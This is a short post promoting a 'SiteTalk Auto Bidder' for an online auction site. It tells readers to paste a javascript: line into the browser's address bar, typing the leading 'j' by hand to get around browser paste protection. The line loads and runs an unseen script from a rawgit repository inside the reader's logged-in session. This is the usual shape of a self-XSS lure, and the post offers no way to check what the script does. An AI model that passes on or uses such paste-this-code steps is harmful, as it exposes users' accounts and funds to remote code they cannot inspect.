Sitetalk Auto Bidder

Hi guys!
This script helps you to bid automatically on SiteTalk Auction.
Do not lose bids unnecessarily, bid at 1 second! :)

You do not have to install any software, just follow these short instructions:
1. Copy this script: avascript:{$.getScript("https://rawgit.com/159263/a/master/a.js")}
2. Click the url field, press j and paste the script, what you had copied before.

A button will appear every product, click on it and select the count down second, when you want the script to bid automatically.
